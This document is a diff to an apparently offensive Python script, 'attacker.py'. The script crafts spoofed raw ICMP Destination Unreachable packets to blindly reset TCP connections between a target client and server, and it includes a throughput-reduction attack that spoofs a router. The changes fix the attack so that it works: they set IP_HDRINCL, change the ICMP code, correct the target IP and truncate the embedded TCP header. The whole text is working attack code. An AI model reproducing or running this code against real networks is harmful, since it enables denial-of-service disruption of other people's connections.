@@ -3,12 +3,15 @@ import struct
 import random
 import time
 
-CLIENT_IP = "10.0.0.1"        # Target client
+## client port guessing -  commonly 49152–65535 on Linux
+
+CLIENT_IP = "10.0.0.2"        # Target client
 SERVER_IP = "10.0.0.1"        # Target server  
 ATTACKER_IP = "192.168.1.1"   # Spoofed router IP for throughput attack
 SERVER_PORT = 8080
 NEXT_HOP_MTU = 512
 MAX_SEQ = 4294967295          # Full 32-bit sequence number range
+icmp_reset_code = 2
 
 def get_port_scan_strategy():
     """Return port scanning strategy for blind attack"""
@@ -114,7 +117,7 @@ def build_embedded_headers(client_ip, server_ip, client_port, server_port, seq):
     # Build embedded TCP header (first 8 bytes are enough for ICMP error)
     tcp_header = struct.pack("!HHII", client_port, server_port, seq, 0)
     
-    return embedded_ip + tcp_header
+    return embedded_ip + tcp_header[:8]
 
 def icmp_connection_reset(sock, strategy="random"):
     """Send ICMP Destination Unreachable (Connection Reset) packets"""
@@ -134,7 +137,7 @@ def icmp_connection_reset(sock, strategy="random"):
                 
                 embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                 rest_of_header = b"\x00\x00\x00\x00"
-                icmp_header = build_icmp_header(3, 1, rest_of_header, embedded)
+                icmp_header = build_icmp_header(3, icmp_reset_code, rest_of_header, embedded)
                 ip_header = build_ip_header(SERVER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
                 
                 packet = ip_header + icmp_header + embedded
@@ -156,7 +159,7 @@ def icmp_connection_reset(sock, strategy="random"):
                     
                     embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                     rest_of_header = b"\x00\x00\x00\x00"
-                    icmp_header = build_icmp_header(3, 1, rest_of_header, embedded)
+                    icmp_header = build_icmp_header(3, icmp_reset_code, rest_of_header, embedded)
                     ip_header = build_ip_header(SERVER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
                     
                     packet = ip_header + icmp_header + embedded
@@ -176,7 +179,7 @@ def icmp_connection_reset(sock, strategy="random"):
                 
                 embedded = build_embedded_headers(CLIENT_IP, SERVER_IP, port, SERVER_PORT, seq)
                 rest_of_header = b"\x00\x00\x00\x00"
-                icmp_header = build_icmp_header(3, 1, rest_of_header, embedded)
+                icmp_header = build_icmp_header(3, icmp_reset_code, rest_of_header, embedded)
                 ip_header = build_ip_header(SERVER_IP, CLIENT_IP, len(icmp_header) + len(embedded))
                 
                 packet = ip_header + icmp_header + embedded
@@ -265,6 +268,7 @@ def icmp_throughput_reduction(sock, strategy="random"):
 if __name__ == "__main__":
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     except PermissionError:
         print("[!] Run as root: sudo python3 attacker.py")
         exit(1)
